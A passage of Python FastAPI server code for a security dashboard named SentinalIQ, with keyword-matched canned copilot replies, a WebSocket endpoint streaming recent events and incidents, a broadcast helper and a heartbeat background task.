    elif "log" in message or "event" in message:
        return "You can explore the Log Explorer to search through thousands of security events. I can help you filter by severity, source, or event type. Try searching for specific IP addresses or error patterns."
    elif "waf" in message or "firewall" in message or "web" in message:
        return "The WAF is actively blocking malicious requests. There are several rule categories active including SQL injection, XSS, and path traversal prevention. Would you like a summary of blocked traffic or help tuning a rule?"
    elif "setting" in message or "config" in message:
        return "You can configure your profile settings, notification preferences, and theme (dark/light) in the Settings page. Would you like me to guide you through any specific configuration?"
    elif "help" in message or "what" in message:
        return "I'm SentinalIQ Copilot! I can help you with:\n🔍 **Incidents** - Review and manage security incidents\n🛡️ **Threat Intel** - Analyze IOCs and threat actors\n💻 **EDR** - Monitor endpoints and investigate threats\n📋 **Logs** - Search and filter security events\n🌐 **WAF** - Review and manage firewall rules\n⚙️ **Settings** - Configure your experience\n\nWhat would you like to explore?"
    else:
        return (
            f"Based on current telemetry, the security posture shows **{total} incidents** "
            f"({critical} critical). The system is actively monitoring and processing events. "
            f"How can I assist you with your security operations today?"
        )


# ─── WebSocket ─────────────────────────────────────────────────────────────

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    ws_connections["alerts"].append(websocket)
    try:
        # Send initial connection message
        await websocket.send_json({
            "type": "connected",
            "message": "Connected to SentinalIQ real-time stream",
            "timestamp": datetime.now(timezone.utc).isoformat()
        })

        # Send bulk initial data
        db = SessionLocal()
        try:
            # Send recent alerts as initial state
            recent_events = db.query(LogEvent).order_by(desc(LogEvent.timestamp)).limit(10).all()
            await websocket.send_json({
                "type": "initial_events",
                "data": [e.to_dict() for e in recent_events],
                "bulk": True
            })

            recent_incidents = db.query(Incident).filter(Incident.status != "resolved").limit(5).all()
            await websocket.send_json({
                "type": "initial_incidents",
                "data": [i.to_dict() for i in recent_incidents],
                "bulk": True
            })

            # Send recent monitor events
            recent_monitor = db.query(MonitorEvent).order_by(desc(MonitorEvent.timestamp)).limit(20).all()
            await websocket.send_json({
                "type": "initial_monitor",
                "data": [e.to_dict() for e in recent_monitor],
                "bulk": True
            })
        finally:
            db.close()

        # Keep connection alive and handle messages
        while True:
            try:
                data = await websocket.receive_text()
                msg = json.loads(data)
                if msg.get("type") == "ping":
                    await websocket.send_json({"type": "pong"})
            except WebSocketDisconnect:
                break
            except json.JSONDecodeError:
                pass
    except WebSocketDisconnect:
        pass
    finally:
        if websocket in ws_connections["alerts"]:
            ws_connections["alerts"].remove(websocket)


async def broadcast_alert(data: dict):
    """Broadcast data to all connected WebSocket clients"""
    if not ws_connections["alerts"]:
        return
    message = json.dumps({
        "type": data.get("type", "alert"),
        "data": data.get("data", {}),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "bulk": False,
    })
    dead_connections = []
    for ws in ws_connections["alerts"]:
        try:
            await ws.send_text(message)
        except Exception:
            dead_connections.append(ws)
    for ws in dead_connections:
        ws_connections["alerts"].remove(ws)


# ─── Simulated real-time alerts (background task) ──────────────────────────

@app.on_event("startup")
async def start_background_tasks():
    asyncio.create_task(simulate_realtime_alerts())


async def simulate_realtime_alerts():
    """Minimal heartbeat — only sends a ping every 5 minutes, no DB noise"""
    while True:
        await asyncio.sleep(300)  # Every 5 minutes
        if ws_connections["alerts"]:
            await broadcast_alert({
                "type": "heartbeat",
                "data": {"message": "System healthy", "timestamp": datetime.now(timezone.utc).isoformat()}
            })


# ─── Run ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="0.0.0.0", port=8000, reload=True)
